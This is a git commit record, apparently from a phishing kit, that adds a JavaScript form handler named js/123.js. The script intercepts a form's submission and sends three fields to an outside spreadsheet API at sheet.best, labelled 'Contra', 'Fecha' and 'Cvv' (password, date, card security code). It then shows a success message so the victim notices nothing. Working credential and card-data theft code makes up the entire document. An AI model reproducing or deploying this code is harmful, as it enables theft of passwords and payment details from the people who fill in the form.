2772ea1c2eb0249c9c1c0781f3d29cfd75966a40
soporte-ml <bluesmeralda4@gmail.com>
2024-10-02 19:40:33 -0600

    add files uplad data 2

---
+++ js/123.js
@@ -0,0 +1,31 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://sheet.best/api/sheets/6473bba2-7120-4be1-b224-7e6831d3fc95', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Contra": formulario.usuario.value,
+            "Fecha": formulario.contraseña.value,
+            "Cvv": formulario.confirmar.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
